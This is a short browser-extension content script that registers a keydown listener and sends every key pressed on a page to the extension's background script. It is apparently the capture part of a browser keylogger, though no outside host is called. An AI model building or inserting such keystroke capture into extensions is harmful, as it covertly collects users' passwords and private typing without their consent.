// // content_script.js

// console.log('Content script is running');

// // Capture keyboard input
document.addEventListener('keydown', function(event) {
  browser.runtime.sendMessage({ type: 'keystrokes', data: event.key });
  // console.log('Keyboard:', event.key);
});
